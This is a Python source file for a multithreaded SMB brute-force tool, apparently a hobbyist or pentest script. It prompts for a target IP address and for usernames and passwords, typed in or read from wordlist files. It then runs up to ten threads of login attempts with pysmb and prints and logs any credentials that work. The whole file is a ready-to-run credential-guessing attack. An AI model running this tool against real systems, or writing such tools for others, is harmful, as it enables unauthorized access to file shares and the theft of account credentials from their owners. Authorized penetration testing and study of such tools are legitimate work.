import ipaddress
import os
import getpass
import timeit
import threading
import logging
import socket
from smb.SMBConnection import SMBConnection
import signal


# Set up Ctrl+C signal handler
def signal_handler(signal, frame):
    exit_program()

# Register the signal handler
signal.signal(signal.SIGINT, signal_handler)


def exit_program():
    print("\nExiting program...")
    os._exit(0)


print("""
               _     
 ___ _ __ ___ | |__  
/ __| '_ ` _ \| '_ \ 
\__ \ | | | | | |_) |
|___/_| |_| |_|_.__/ 
""")

found_credentials = False

# Check if the user input is in IP address format
def get_ip(target_input):
    try:
        return ipaddress.IPv4Address(target_input)
    except ipaddress.AddressValueError:
        return None

# Get the user input for username
def get_username(user_input):
    while True:
        if user_input == "U":
            return [input("Enter username: ")]
        elif user_input == "L":
            file_path = input("Enter the file path: ")
            file_path = rf"{file_path}"
            if os.path.isfile(file_path):
                print(f"The file path is: {file_path}")
                with open(file_path, 'r', encoding='utf-8-sig') as f:
                    lines = f.readlines()
                    user_list = [line.strip() for line in lines]
                return user_list
            else:
                print('The file does not exist')
        else:
            print('Invalid choice. Please enter U or L.')
            user_input = input("Enter U for a specific user or L for a list of users: ")

# Get the user input for password
def get_password_list(pass_input):
    while True:
        if pass_input == "P":
            return [getpass.getpass("Enter password: ")]
        elif pass_input == "L":
            file_path = input("Enter the file path: ")
            file_path = rf"{file_path}"
            if os.path.isfile(file_path):
                print(f"The file path is: {file_path}")
                with open(file_path, 'r', encoding='utf-8-sig') as f:
                    lines = f.readlines()
                    password_list = [line.strip() for line in lines]
                return password_list
            else:
                print('The file does not exist')
        else:
            print('Invalid choice. Please enter P or L.')
            pass_input = input("Enter P for a specific password or L for a list of passwords: ")

# Perform SMB brute force
def smb_brute(ip, username_input, password_input):
    if isinstance(username_input, str):
        username_list = [username_input]
    else:
        username_list = username_input

    if isinstance(password_input, str):
        password_list = [password_input]
    else:
        password_list = password_input

    found_login = False  # Flag variable to track successful login

    for username in username_list:
        if found_login:  # Check if successful login found
            break

        for password in password_list:
            try:
                conn = SMBConnection(username, password, '', '')
                conn.connect(ip)
                logging.info(f'Successful login - username: {username}, password: {password}')
                print(f'Successful login - username: {username}, password: {password}')
                conn.close()
                found_login = True  # Set flag to True if successful login found
                break
            except Exception as e:
                logging.warning(f'Authentication failed - username: {username}, password: {password}')
                print(f'Authentication failed - username: {username}, password: {password}')

        if found_login:  # Check if successful login found
            break  # Break out of outer loop when successful login found

    return
def main():
    logging.basicConfig(filename='brute_force.log', level=logging.INFO,
                        format='%(asctime)s - %(levelname)s - %(message)s')

    while True:
        target_choice = input("Enter the IP target: ")
        if get_ip(target_choice) is None:
            print("Invalid IP address")
        else:
            break

    while True:
        user_choice = input("Enter U for a specific user or L for a list of users: ")
        username_input = get_username(user_choice)
        if username_input is not None:
            break

    while True:
        pass_choice = input("Enter P for a specific password or L for a list of passwords: ")
        password_input = get_password_list(pass_choice)
        if password_input is not None:
            break

    start_time = timeit.default_timer()  # start timer

    threads = []
    max_threads = 10  # Maximum number of concurrent threads

    # Perform brute force
    for username in username_input:
        for password in password_input:
            if len(threads) >= max_threads:
                # Wait for the threads to finish if the maximum number of threads is reached
                for thread in threads:
                    thread.join()
                threads = []
            thread = threading.Thread(target=smb_brute, args=(target_choice, username, password))
            thread.start()
            threads.append(thread)

    # Wait for any remaining threads to finish
    for thread in threads:
        thread.join()

    # Calculate elapsed time
    elapsed_time = timeit.default_timer() - start_time

    print(f"Elapsed time: {elapsed_time:.2f} seconds")

if __name__ == "__main__":
    main()
